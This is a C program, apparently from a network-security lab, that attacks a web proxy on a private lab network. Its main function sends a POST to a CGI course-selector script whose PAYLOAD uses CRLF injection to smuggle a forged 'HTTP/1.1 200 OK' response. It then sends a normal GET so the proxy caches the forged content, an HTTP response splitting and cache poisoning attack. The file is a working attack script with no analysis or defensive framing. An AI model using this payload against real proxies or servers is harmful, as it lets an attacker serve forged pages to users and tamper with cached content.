#include <errno.h>
#include <limits.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/udp.h>


#define ATTACKER_SERVER_ADDR 192, 168, 1, 201
#define PROXY_ADDR 192, 168, 1, 202
#define WEB_SERVER_ADDR 192, 168, 1, 203
#define STR(x) #x

#define FILE_NAME "spoofed-reflected.txt"

union address {
    uint8_t fields[4];
    uint32_t l;
};

enum {
    MAX_ITERS = 20,
    WIRE_LEN = 4096,
    IP_ID = 0x1222,
    CLIENT_PORT = 12345,
    ATTACKER_SERVER_PORT = 34567,
};

int32_t create_socket() {
    int32_t sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd <= 0) {
        #ifdef __MY_DEBUG__
                printf("create socket failed...\n");
        #endif
                close(sockfd);
                exit(0);
    }

    return sockfd;
}

void _listen(const int32_t sockfd) {
    if (listen(sockfd, 5) < 0) {
#ifdef __MY_DEBUG__
        printf("listen failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
}

void _bind(const int32_t sockfd, const uint8_t field0, const uint8_t field1,
           const uint8_t field2, const uint8_t field3, const uint16_t port) {
    struct sockaddr_in addr_in = {0};

    addr_in.sin_family = AF_INET;
    const union address address = {{field0, field1, field2, field3}};
    addr_in.sin_addr.s_addr = address.l;

    addr_in.sin_port = htons(port);

    if (bind(sockfd, (struct sockaddr *) &addr_in, sizeof(addr_in)) < 0) {
#ifdef __MY_DEBUG__
        printf("bind failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
}

int32_t _accept(const int32_t sockfd) {
    struct sockaddr addr = {0};
    socklen_t addrlen = sizeof(addr);
    int32_t clientfd = accept(sockfd, &addr, &addrlen);
    if (clientfd < 0) {
#ifdef __MY_DEBUG__
        printf("accept failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
    return clientfd;
}

size_t _recv(const int32_t sockfd, void *  buf, size_t size) {
    ssize_t sz = recv(sockfd, buf, size, 0);
    if (sz < 0) {
#ifdef __MY_DEBUG__
        printf("recv failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
    return (size_t)sz;
}

FILE *_fopen(const char *restrict path) {
    FILE * file = fopen(path, "w");
    if (file == 0) {
        #ifdef __MY_DEBUG__
                printf("fopen failed...\n");
        #endif
                exit(0);
    }
    return file;
}

size_t _fwrite(const void *restrict ptr, size_t size, size_t nitems, FILE *restrict stream) {
    size_t written = fwrite(ptr, size, nitems, stream);

    if (written < nitems) {
        #ifdef __MY_DEBUG__
            printf("fwrite failed...\n");
        #endif
        exit(0);
    }

    return written;
}

void _sendto(const int32_t sockfd, const void *const buff, size_t buff_size,
             const uint8_t field0, const uint8_t field1,
             const uint8_t field2, const uint8_t field3, const uint16_t port) {
    struct sockaddr_in addr_in = {0};

    addr_in.sin_family = AF_INET;
    const union address address = {{field0, field1, field2, field3}};
    addr_in.sin_addr.s_addr = address.l;

    addr_in.sin_port = htons(port);

    if (sendto(sockfd, buff, buff_size, 0, (struct sockaddr *) &addr_in, sizeof(addr_in)) < 0) {
#ifdef __MY_DEBUG__
        printf("sendto failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
}

void _connect(const int32_t sockfd, const uint8_t field0, const uint8_t field1,
           const uint8_t field2, const uint8_t field3, const uint16_t port) {
    struct sockaddr_in addr_in = {0};

    addr_in.sin_family = AF_INET;
    const union address address = {{field0, field1, field2, field3}};
    addr_in.sin_addr.s_addr = address.l;

    addr_in.sin_port = htons(port);

    if (connect(sockfd, (struct sockaddr *) &addr_in, sizeof(addr_in)) < 0) {
#ifdef __MY_DEBUG__
        printf("connect failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
}

void _send(const int32_t client, const void * const data, size_t size) {
    if (0 > send(client, data, size, 0)) {
#ifdef __MY_DEBUG__
        perror("Sending failed...\n");
#endif
        close(client);
        exit(0);
    }
}

#define PAYLOAD "course_id=67607%0d%0aConnection:%20Keep-Alive%0d%0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aLast-Modified:%20Sat%2010%20Jan%202026%2012:00:00%20GMT%0d%0aContent-Length:%20150"

void empty_recv(const int sockfd) {
    char buf[1024];
    memset(buf, 0, sizeof(buf));

    _recv(sockfd, buf, sizeof(buf));
    puts(buf);
}

int32_t main() {
    int32_t sockfd = create_socket();

    _connect(sockfd, PROXY_ADDR, 8080);

    const char mal_req[] = "POST /cgi-bin/course_selector? HTTP/1.1\r\n"
        "Host: 192.168.1.202\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 340\r\n"
        "Connection: close\r\n"
        "\r\n"
        PAYLOAD;

    _send(sockfd, mal_req, sizeof(mal_req) - 1);


    empty_recv(sockfd);


    const char inn_req[] = "GET /67607.html HTTP/1.1\r\n"
        "Host: 192.168.1.202\r\n"
        "Connection: close\r\n"
        "\r\n";

    _send(sockfd, inn_req, sizeof(inn_req) - 1);

    empty_recv(sockfd);

    close(sockfd);
}
